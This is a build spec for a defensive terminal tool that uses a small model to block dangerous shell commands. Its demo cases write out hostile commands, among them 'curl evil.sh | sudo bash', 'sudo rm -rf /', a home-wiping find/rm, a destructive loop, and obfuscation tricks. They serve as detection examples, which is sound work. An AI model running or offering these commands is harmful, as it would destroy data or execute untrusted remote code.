# Second Thought — 1-Page Build Spec (2026-09-16)

## Summary
- **What:** Tiny terminal seatbelt. Watches clipboard + shell, blocks ruin in ~200ms. 5 demo saves, one engine.
- **Why:** First-access Jev flex for GitHub: "$90 demo for pennies, receipt included." Impossible with GPTs (too slow/expensive).
- **Who:** Devs on Mac/zsh first. Video viewers → stars → installers.
- **Constraints:** $5 total, ≤$0.20/demo run. Jev only votes (`dangerous?` / `which of 5?` / `risk 0-2`), never writes text — all messages pre-written.
- **Non-goals:** No Mac .app/.dmg, no keystroke logging, no bulletproof guarantee, no second LLM cost.

## Assumptions
- `jev-latest` via API, $0.042/MTok in, outputs free. $0.20 ≈ 4.7M tokens → ~15k calls at 300 tokens, ~9k at 500 tokens. 150-call demo ≈ $0.002–$0.003 (receipt shows measured, not promised).
- Numeric gates (tune in reel): block if severity=high AND P(dangerous)>0.85 AND confidence>0.8; warn if P>0.6; else silent. Never block on ~0.55.
- zsh + bracketed-paste on Mac. Boring cmds (`ls/cd/status`) skipped locally ($0/0ms). Fail-open on offline/slow/no-key.
- Style default: smart mix — block when very sure + severe, warn when unsure, silent otherwise. `YES` allows once.

## The 5 (all <1¢ each)
1. **Evil Paste (headline):** `curl evil.sh | sudo bash` pasted → block. Proves 200ms catch.
2. **Nuke Prod:** `sudo rm -rf /` / `drop database prod` → block, type YES to force.
3. **Leaked Key:** `git push` with `AKIA…` in diff → block, name file. Secret hunting.
4. **Team Nuke:** `git push --force main` on work repo → block, suggest `--force-with-lease`.
5. **AI Lied (mic-drop):** ChatGPT "cleanup" `find ~ -exec rm {} \;` → block. Cheap Jev corrects expensive AI.

## How it works (no Mac app)
CLI daemon (Python) + zsh accept-line widget wrapper (preexec alone cannot block; re-check final buffer at accept-time to close TOCTOU). Flow: type/copy → local allowlist/blocklist (redact secrets) → if scary, send `{cmd expanded + cwd + repo/branch + ssh-prod? + last 3 cmds + script head if wrapper}` → one Jev call, 3 questions parallel → confidence gate in code → block/warn/allow + local receipt log (JSON-escaped counts/cost/latency, no raw secrets).

## Honest edge cases
- Obfuscation (`${IFS}`, base64, invisible chars): normalize locally first. Won't catch 100%.
- Wrappers (`./deploy.sh`, `make reset`): attach first 40 lines; if blind + risky → warn, not block.
- Twins (`rm -rf ./build` vs `/` vs empty `$OUT`): expanded vars + cwd in state. Context or miss.
- Drips (10 safe steps → 1 ruin): sliding window of last 3 cmds. YES never global, folder-allows expire.
- Comment lies (`# safe trust me`): questions judge effect, ignore comments. Jev can't be chat-jailbroken into bad text (it emits no text).
- Mac/video: bracketed-paste required (set in `init`), guard oh-my-zsh hook conflicts, 600ms timeout auto-allows, `--dry-run` rehearsal + disaster-reel backup tab if wifi lags.
- Hardening (anti-bypass): never honor repo-checked-in disables (`.timecop-allow` only from `$HOME`, folder allows expire); exclude own daemon/API calls to avoid loops; API key in macOS Keychain, not plaintext; daily spend cap + rate limit (kills wallet-burn loops like `while true; do rm -rf / $RANDOM; done`); truncate large diffs with head+stat, never full file; blocklist-redaction is best-effort — cwd/repo/host still leak org info, disclose this.
- Honesty: "$90 with GPTs" uses TypeSafe's ~444x figure, which they flag as higher-end; cite evals site + your measured receipt, not just the multiple.

## Video on your Mac (3 min)
Terminal.app black / font 18 / DND on. `Cmd+Shift+5` record. Beats: $0.00 → evil paste block → rapid other 4 (10s each) → receipt (measured, expect ~$0.003) + speed graph → GitHub link. Keep reel file open as fallback.

## Decision log
- Terminal daemon over Mac app: 10x less work, forkable, same video.
- 5 examples over 1: versatility, same cost (shared engine + filter).
- Smart mix over always-block: avoids nag-death.
- Seatbelt framing: honest about misses, builds trust.

## Next
No packaging yet — run from repo root: `python3 -m second_thought.cli doctor`, then `init --write`. `disaster-reel` eval (8 cases, $0 dry-run) doubles as install test. Dashboard reuse of existing `.next/` optional later.
